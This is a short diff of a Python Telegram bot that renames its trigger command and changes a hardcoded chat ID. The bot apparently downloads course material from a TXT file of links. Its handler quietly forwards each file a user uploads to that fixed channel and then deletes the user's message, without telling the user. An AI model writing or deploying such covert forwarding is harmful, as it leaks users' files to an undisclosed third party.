@@ -38,12 +38,12 @@ async def restart_handler(_, m):
     os.execl(sys.executable, sys.executable, *sys.argv)
 
 
-@bot.on_message(filters.command(["Ak47"]))
+@bot.on_message(filters.command(["acinom"]))
 async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('𝗦𝗘𝗡𝗗 𝗧𝗫𝗧 𝗙𝗜𝗟𝗘 𝗙𝗢𝗥 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗖𝗢𝗨𝗥𝗦𝗘 𝗔𝗡𝗗 𝗨𝗣𝗟𝗢𝗔𝗗 𝗧𝗢 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(-1002485430920, x)
+    await bot.send_document(-1002470919436, x)
     await input.delete(True)
 
 
